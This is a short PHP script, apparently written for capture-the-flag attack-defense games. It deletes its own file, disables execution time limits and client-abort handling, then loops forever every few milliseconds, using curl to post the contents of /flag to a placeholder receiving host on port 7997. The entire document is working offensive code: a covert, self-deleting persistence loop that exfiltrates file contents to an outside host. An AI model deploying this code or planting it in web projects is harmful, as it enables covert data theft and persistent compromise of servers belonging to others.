<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
function broadcast(){
    $result = system("curl -d @/flag RECV_HOST_REPLACE:7997 > /dev/null");

}
while (1){ broadcast(); usleep(5000); }
?>